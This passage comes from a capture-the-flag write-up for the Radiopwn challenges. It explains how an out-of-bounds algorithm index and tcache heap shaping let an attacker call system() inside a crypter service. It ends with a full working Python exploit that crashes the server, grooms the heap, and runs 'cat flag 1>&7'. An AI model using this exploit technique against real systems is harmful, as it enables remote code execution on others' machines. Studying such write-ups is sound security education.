sending b'\x17\x0e@\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
recv: b'\x17\x0e@\x00\x01hTSrY8C7v31MfTbahTSrY8C7v31MfTbahTSrY8C7v31MfTbahTSrY8C7v31MfTba\x00'
```

Now with the real server:
`space{1m_1n_j4p4n_c4n_y0u_g3t_rc3_f0r_m3?_7yk90lah543}`

Victory!

![discord](/assets/image13.png)

# Part 4 — Stage 2 Overview: From Key Leakage to Remote Code Execution (Radiopwn2)

Stage 1 focused on abusing the crypter’s parsing logic to leak all encryption keys, including the embedded flag.
Stage 2, however, is a completely different style of challenge: here the flag is stored in a file, not inside the keys table. Nothing in the program ever reads this file during normal operation.
Therefore, leaking keys is no longer useful, we now need code execution.

## What Changes in Radiopwn2?

In the second challenge, the flag is located in a file called flag (with the contents `space{FAKE_FLAG_2}` locally). This file is:
- Copied into the container via `Dockerfile`
![copy flag file](/assets/image9.png)
- Owned by the same user that runs the service
- Completely unknown to the program logic (never opened)

This means:
To obtain the second flag, we must make the crypter or its host process execute a command that manually reads the file.
Since the program itself never references it, information disclosure is insufficient, we must escalate to RCE.

## Initial Recon: What Exploitation Primitives Do We Have?

From reversing Stage 1 and exploring the crypter behavior deeper, two powerful primitives emerge:

### 1. Buffer Over-Read Primitive

If we send a frame where the declared payload length (`len_lo | len_hi << 8`) is greater than the actual number of payload bytes we provide, the crypter will:

- Decrypt in place up to the declared length
- Read past the end of our buffer
- Echo back whatever memory lies beyond
- This gives us memory disclosure, especially useful for examining heap layouts.

### 2. Arbitrary Function Pointer Call (Limited)

Recall the algorithm dispatch table:
`algos[algo_id] → function pointer`

The table is dynamically allocated on the heap during initialization. If we send an `algo_id` larger than the table size, the crypter will read out-of-bounds memory and interpret whatever 8 bytes it finds there as a function pointer.
And then it will call it.
This means we can hijack execution, but only to addresses located immediately after the algorithm table allocation on the heap.
This becomes the core RCE primitive for the stage.

## Is ASLR an Issue?

![checksec](/assets/image5.png)

Fortunately:
- PIE is disabled
- The service runs a fixed `python3.12` binary
- libc is loaded at predictable addresses on every restart

This means:
`system()` has a stable, known address.

![system function ida](/assets/image2.png)

## Why Heap Shaping Matters

The algorithm table is allocated at runtime with a small fixed size:
- Table entry size: 8 bytes
- Total allocation: ~0x18 bytes (3 algorithms × 8 bytes)

These small allocations are handled by tcache bins (for size 0x20).
To control what comes immediately after this allocation in memory, we must carefully:
- Create allocations
- Free allocations
- Refill tcache bins
- Trigger new allocations in specific order

![heap bins cmd](/assets/image7.png)
![heap bins output](/assets/image1.png)

The goal is to place our crafted frame buffer directly after the algorithm table.
When that happens:
- The crypter interprets our payload as `algos[algo_id]`
- The fake function pointer at the right offset becomes `system()`
- The argument passed to the function is our controlled command string

This results in arbitrary command execution inside the container, allowing us to read and exfiltrate the flag.

## Remote GDB Setup for Analyzing the Container

To properly analyze the heap behavior and verify the exploit, I needed the ability to attach GDB to the Python process running inside the container. The default challenge image did not include any debugging hooks, so a small modification was required.

### 1. Exposing a Debug Port

In `docker-compose.yml`, I added an additional port mapping:

```yaml
ports:
  - "7777:7777"
```

This gave me a TCP port through which GDB could connect to the process.

### 2. Launching the Python Process Under GDBserver

Inside the container, I modified the startup command so the service runs under `gdbserver` instead of executing Python directly:

```bash
gdbserver 0.0.0.0:7777 python3 radiopwn.py
```

This attaches the Python interpreter to GDBserver and opens a remote debugging session on port 7777.

### 3. Connecting From the Host

With the container running, I used the host’s GDB to connect remotely:

```bash
gdb python3
(gdb) target remote localhost:7777
```

At this point, I could:

* Set breakpoints inside `handle_pdu`
* Inspect the tcache bins and current heap layout
* Step through the allocation of the algorithm table
* Confirm the placement of my controlled payload after heap shaping

This setup was crucial for identifying the correct offsets, validating that the `system()` pointer was reachable via out-of-bounds `algo_id`, and ensuring the exploit would be deterministic.

## Prerequisite: Understanding system()’s Argument

To extract the flag, we need a working shell command whose output returns over our open socket.
Examining the file descriptors inside the container:

Before communication:
![fd before](/assets/image18.png) 
After communication:
![fd after](/assets/image17.png) 
- FD 7 corresponds to our TCP connection
- Writing to FD 7 sends bytes directly back to us

Therefore, a simple and elegant command works:

```sh
cat flag 1>&7
```

This:
- Reads the flag file
- Redirects stdout to FD 7 (our socket)
- Sends the flag back to the attacker

This command becomes the basis of the crafted payload injected into heap memory.

# Part 5 — Stage 2 Exploit: Heap Shaping, Fake Algo, and Calling system()

In Stage 2, we already know:
- We can make the crypter call a function pointer from the algorithm table using a controlled `algo_id`.
- `system()` has a known, stable address (PIE disabled, fixed Python binary).
- The flag lives in a file (`flag`) that the program never reads by itself.

Now we want to turn the out-of-bounds `algo_id` into a reliable call to `system(cmd)`, where `cmd` is fully controlled and reads the flag back to our socket.
To achieve this, we need to:
1. Shape the heap so that our frame buffer sits immediately after the algorithm table allocation.
2. Place the `system()` address at a predictable offset relative to the start of that allocation.
3. Use an out-of-bounds `algo_id` so that `algos[algo_id]` points into our controlled data, where the fake function pointer (`system`) lives.
4. Make sure the "argument" passed to that function is a pointer to our command string (`"cat flag 1>&7"`).

## Heap Internals: tcache

The algorithm table is allocated with size `0x18` bytes (3 entries × 8-byte function pointers). On glibc, this goes into the tcache bin for size 0x20.
We can also influence other allocations of similar sizes by sending frames and causing the crypter to allocate and free temporary structures. By carefully choosing:
- How many frames we send
- Their sizes
- In which order allocations and frees occur

we can influence which freed chunks are reused for:
- The algorithm table allocation
- The buffer holding our final crafted frame

The end goal is to obtain a heap layout like:
`[ 0x18-byte chunk: algos table ]
[ 0x... byte chunk: our frame buffer (controlled) ]`

I found a combination of frames send that results this layout, which is **sending 2 frames size 0x18 and then an exploit frame size 0x28**.
I achieved this by debugging, examining the tcache bins and the memory layout.

Once this happens, any out-of-bounds index into `algos[]` will read into our frame buffer and interpret it as an array of function pointers.

## Placing system() on the Heap

Remember the call pattern:
`algos[algo_id](payload, len, ctx);`

Conceptually, what we want is:
````
algos[algo_id] = system;
payload        = "cat flag 1>&7"
```

So we craft our frame payload to contain:
- A command string: `"cat flag 1>&7`" (with spaces for alignment).
- A null terminator (`\x00`).
- The address of `system()` immediately afterwards.
- Padding to fill the rest of the declared payload.

Because the crypter interprets `algos[algo_id]` as a function pointer, if we pick the correct index (i.e., the correct offset into this buffer), it will land exactly on the 8-byte chunk containing the `system()` address.
In the exploit, the final payload looks like:

```python
payload = (
    b'cat  flag 1>&7    '               # command string + spaces for alignment
    b'\x00'                             # null terminator
    b'\xc0\x06\x42\x00\x00\x00\x00\x00' # system address
    b'\x00\x00\x00\x00\x00\x00\x00\x00'
)
```

Here:
- The ASCII part is the shell command.
- The `\x00\xc0\x06\x42...` sequence encodes the address of `system()` (little-endian).
- The extra zeros are padding to keep the memory nicely shaped.

You also choose the frame length so that:
5 bytes (frame header) + command + `\0` + system address
neatly fill a 0x28-sized region when combined.

## Finding the Right algo_id Offset

After heap shaping, we set a breakpoint inside `handle_pdu`, at the moment the algo table is allocated, and capture its address. Then we inspect memory around it.

Not far after the algos allocation, we can see:
- The table itself
- Our frame buffer
- The command string
- The embedded `system()` pointer

By dumping memory, we can count how many 8-byte steps it takes from the start of the `algos` allocation to reach the `system()` address inside our payload.
That count turns out to be:
`0x11 (17 decimal)`

Since each entry is 8 bytes, `algos[0x11]` ends up reading the fake pointer embedded in our frame, which we set to `system()`.
Thus:
`algo_id = 0x11`
→ `algos[0x11] = *(heap_base + 0x11 * 8)`
→ That location holds the `system()` address

When the crypter calls:
`algos[algo_id](payload, len, ctx);`

It effectively becomes:
`system("cat flag 1>&7");`

because `payload` points into our frame buffer where the command string lives.

## Making the Layout Deterministic: Crashing the Server

Heap exploitation can be fragile if the layout changes between runs. Luckily, the challenge setup uses supervisord to automatically restart the service when it crashes.

![supervisord](/assets/image22.png)

This gives us a powerful advantage:
- We can deliberately crash the process to reset it into a fresh, predictable heap state.
- After restart, the sequence of allocations and frees we perform will be the same every time, as long as we send the same frames in the same order.

By combining:
- Knowledge of tcache behavior
- A stable restart mechanism
- Controlled allocations via frames

we get a deterministic heap layout, which means the offset (`algo_id = 0x11`) and the position of our crafted chunk stay reliable.  

## Triggering the Exploit and Getting the Flag

With everything aligned:
1. We perform the heap-shaping sequence.
2. We send the final crafted frame with:
- A suitably shaped payload containing `"cat flag 1>&7"` and `system()` address.
- `algo_id = 0x11`.

3. The crypter interprets `algos[0x11]` as our fake function pointer.
4. It calls `system("cat flag 1>&7")`.

![output flag2](/assets/image11.png)

Result: the second flag is printed back over the socket.

Victory!

We’ve escalated from a controlled key-decryption primitive in Stage 1
to full code execution with `system()` in Stage 2 and successfully exfiltrated `space{FAKE_FLAG_2}`.


Here is the working exploit:
```python
def send_bytes(b):
    print("sending", b)
    try:
        with socket.create_connection((HOST, PORT), timeout=2) as s:
            s.sendall(b)
            s.settimeout(TIMEOUT)
            try:
                resp = s.recv(4096)
                print("recv:", resp)
            except socket.timeout:
                print("no response (timeout)")
    except ConnectionRefusedError:
        print("connection refused — is the server listening on 127.0.0.1:5000?")
    except Exception as e:
        print("send error:", e)

def send_size(size):
    key_id = 0x0
    declared_len = size - 5 # 5 is header size
    algo_id = 0
    small_payload = b'\xAA' * declared_len  
    frame = bytes([MARK, key_id]) + pack('<H', declared_len) + bytes([algo_id]) + small_payload
    send_bytes(frame)

def full_exploit():
    # Sending frame that crashes via algo_id 19
    key_id = 0x0
    declared_len = 0xff
    algo_id = 19 # non existing algo to crash
    small_payload = b'\xAA' * declared_len  
    frame = bytes([MARK, key_id]) + pack('<H', declared_len) + bytes([algo_id]) + small_payload
    send_bytes(frame)

    # Wait a bit to let server recover
    time.sleep(5)

    # Send 2 frames to shape tcache state
    send_size(0x18)
    send_size(0x18)

    # Send frame to trigger the exploit
    key_id = 0x0
    declared_len = 0x28 - 5
    algo_id = 17 # offset into OOB function-pointer
    small_payload = b'cat  flag 1>&7    \x00\xc0\x06\x42\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    frame = bytes([MARK, key_id]) + pack('<H', declared_len) + bytes([algo_id]) + small_payload
    send_bytes(frame)
```

# Part 6 — Conclusion

The Radiopwn challenges demonstrate how small design flaws compound into powerful exploitation paths.
In Stage 1, a weak framing format and unauthenticated XOR "encryption" turned the crypter into a key oracle. Because decryption occurred in place and the output was returned to the client, sending zero-filled payloads directly exposed the keys, including the flag.
Stage 2 expanded this into code execution. Two issues made this possible:
- Out-of-bounds algorithm indexing, letting the attacker treat heap data as function pointers.
- Predictable heap allocation (tcache), allowing precise placement of attacker-controlled payloads after the algorithm table.

By shaping the heap, embedding a `system()` pointer, and supplying a command string that redirected output to our socket, we achieved RCE and read the flag file.